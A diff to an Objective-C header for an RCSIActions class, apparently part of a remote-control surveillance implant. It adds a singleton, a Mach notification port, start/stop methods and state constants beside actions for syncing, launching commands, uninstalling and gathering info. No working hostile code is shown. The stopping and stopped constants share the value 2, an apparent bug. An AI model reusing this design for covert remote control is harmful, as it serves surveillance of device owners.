@@ -12,15 +12,27 @@
 #define __RCSIActions_h__
 
 @interface RCSIActions : NSObject
+{
+  NSMutableArray *mActionsMessageQueue;
+  NSMachPort     *notificationPort;
+
+#define ACTION_MANAGER_RUNNING  0
+#define ACTION_MANAGER_STOPPING 2
+#define ACTION_MANAGER_STOPPED  2
+  int             actionManagerStatus;
+}
+
+@property (readonly) NSMachPort *notificationPort;
+
++ (RCSIActions *)sharedInstance;
 
 - (BOOL)actionSync: (NSMutableDictionary *)aConfiguration;
-#if 0
-- (BOOL)actionSyncAPN: (NSMutableDictionary *)aConfiguration;
-#endif
 - (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag;
 - (BOOL)actionLaunchCommand: (NSMutableDictionary *)aConfiguration;
 - (BOOL)actionUninstall: (NSMutableDictionary *)aConfiguration;
 - (BOOL)actionInfo: (NSMutableDictionary *)aConfiguration;
+- (void)start;
+- (BOOL)stop;
 
 @end
 
